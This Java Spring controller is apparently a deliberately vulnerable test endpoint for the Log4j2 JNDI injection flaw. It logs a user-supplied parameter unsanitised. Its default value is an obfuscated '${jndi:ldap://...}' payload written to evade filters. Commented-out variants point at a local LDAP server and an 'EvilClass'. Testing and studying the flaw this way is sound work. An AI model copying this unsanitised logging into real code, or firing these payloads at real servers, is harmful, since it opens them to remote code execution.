package com.orleven.controller;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.web.bind.annotation.*;

/**
 * @Description
 * @Author sgl
 * @Date 2018-05-08 13:55
 */

@ResponseBody
@RestController
@RequestMapping(value = "/log4j2")
public class Log4j2Controller {

    private static final Logger logger = LoggerFactory.getLogger(Log4j2Controller.class);

    @RequestMapping(value = "/test")
    public String test(@RequestParam(name = "text", defaultValue = "") String text){
        if (text.equals("")){
//            text  = "${jndi:ldap://127.0.0.1:1389/test5}";
//            text = "${jndi:ldap://127.0.0.1:80/EvilClass?Type=A Type&Name=1100110&Char=!}";
            text = "${a:-${a:-$${a:-${a:-$${j$${a:-}nd${a:-}i:l${a:-}da${a:-}p://127.0.0.1:1389/test1$${a:-}}}}}}";
        }
        logger.error("user_set:{}", text);
        return text;
    }
}